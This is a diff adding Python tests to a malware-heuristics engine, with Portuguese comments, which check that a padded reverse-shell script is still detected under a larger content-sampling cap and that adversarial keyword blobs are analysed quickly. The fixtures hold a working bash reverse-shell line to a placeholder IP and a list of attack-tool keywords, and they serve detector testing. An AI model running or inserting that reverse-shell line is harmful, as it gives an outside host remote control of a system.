@@ -20,6 +20,7 @@ import os
 import secrets
 import stat
 import struct
+import time
 from pathlib import Path
 from typing  import Generator
 from unittest.mock import MagicMock, patch
@@ -1460,6 +1461,34 @@ class TestHeuristicEngine:
         r = engine.analyze(f)
         assert r.context_summary["entropy"] == round(file_entropy(f), 3)
         assert r.context_summary["entropy"] > 1.0  # não mais o 0.0 do calculo antigo
+
+    def test_content_sample_sees_payload_after_old_64kb_cap(self, engine: HeuristicEngine, tmp_path: Path) -> None:
+        """CONTENT_SAMPLE_SIZE subiu de 64KB para 1 MiB (2026-10-11, decisão do Matheus): com 64KB, um script com
+        o reverse shell depois de ~100KB de comentário escapava de todas as regras de conteúdo no tempo real."""
+        f = tmp_path / "padded.sh"
+        f.write_bytes(b"#!/bin/bash\n" + b"# " + b"a" * 100_000 + b"\n" + b"bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n")
+        r = engine.analyze(f)
+        assert "H006" in r.rules_fired
+
+    def test_content_sample_still_capped(self, engine: HeuristicEngine, tmp_path: Path) -> None:
+        """O cap continua existindo: payload depois de CONTENT_SAMPLE_SIZE não é lido (limite de custo do monitor)."""
+        from ekprotection.heuristics.engine import CONTENT_SAMPLE_SIZE
+        f = tmp_path / "huge.sh"
+        f.write_bytes(b"#!/bin/bash\n" + b"#" * CONTENT_SAMPLE_SIZE + b"\nbash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n")
+        r = engine.analyze(f)
+        assert "H006" not in r.rules_fired
+
+    def test_content_sample_1mib_adversarial_is_fast(self, engine: HeuristicEngine, tmp_path: Path) -> None:
+        """Pior caso conhecido da auditoria de 2026-10-06 (anchors repetidos numa linha só, sem delimitador),
+        agora no tamanho cheio do cap: a análise de um arquivo não pode virar negação de serviço."""
+        from ekprotection.heuristics.engine import CONTENT_SAMPLE_SIZE
+        anchors = b"curl wget crontab history base64 eval nc chmod python -c perl -e /dev/tcp sudo "
+        blob = (anchors * (CONTENT_SAMPLE_SIZE // len(anchors) + 1))[:CONTENT_SAMPLE_SIZE]
+        f = tmp_path / "adversarial.sh"
+        f.write_bytes(blob)
+        t0 = time.monotonic()
+        engine.analyze(f)
+        assert time.monotonic() - t0 < 5.0
 
     def test_disabled_rule_not_fired(self, cfg: ConfigManager, tmp_path: Path) -> None:
         cfg.set("heuristics.disabled_rules", ["H011"])
